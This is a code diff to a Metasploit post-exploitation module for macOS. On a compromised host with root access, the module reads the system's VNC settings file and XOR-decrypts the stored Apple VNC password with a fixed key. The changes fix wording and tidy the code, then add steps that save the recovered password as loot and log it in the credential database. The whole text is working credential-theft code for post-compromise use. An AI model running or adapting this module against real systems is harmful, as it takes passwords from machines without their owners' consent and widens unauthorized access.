@@ -13,7 +13,7 @@ class MetasploitModule < Msf::Post
     super( update_info( info,
         'Name'          => 'OS X Display Apple VNC Password',
         'Description'   => %q{
-            This module show Apple VNC Password from Mac OS X High Sierra.
+            This module shows Apple VNC Password from Mac OS X High Sierra.
         },
         'License'       => MSF_LICENSE,
         'Author'        => [ 'Kevin Gonzalvo <interhack[at]gmail.com>'],
@@ -38,39 +38,30 @@ class MetasploitModule < Msf::Post
     for data in fixedkey;
       str += (data ^ array_pwd.shift).chr
     end
-    return str
-  end
-
-  def get_file(filename)
-    begin
-      client.fs.file.stat(filename)
-      config = client.fs.file.new(filename,'r')
-      value = config.read
-      return value
-    rescue
-      return nil
-    end
+    return str.delete("\0")
   end
 
   def run
-    case session.type
-    when /meterpreter/
-      host = sysinfo["Computer"]
-    when /shell/
-      host = cmd_exec("hostname")
-    end
-
-    print_status("Running module against #{host}")
     unless is_root?
-      fail_with(Failure::NoAccess, 'It is necessary to be root!')
+      fail_with(Failure::NoAccess, "Root privileges are required to read VNC password file")
     end
-    print_status("This session is running as root!")
     print_status("Checking VNC Password...")
     vncsettings_path = '/Library/Preferences/com.apple.VNCSettings.txt'
-    passwd_encrypt = get_file("#{vncsettings_path}")
+    passwd_encrypt = read_file("#{vncsettings_path}")
     final_passwd = decrypt_hash("#{passwd_encrypt}")
     if !final_passwd.nil?
       print_good("Password Found: #{final_passwd}")
+      pass_file = store_loot("osx.vnc.password", "text/plain", session, final_passwd, "passwd.pwd", "OSX VNC Password")
+      print_good("Password data stored as loot in: #{pass_file}")
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: self.fullname,
+        private_type: :password,
+        private_data: final_passwd.to_s,
+        workspace_id: myworkspace_id
+      }
+      create_credential(credential_data)
     else
       print_error("Password not found")
     end
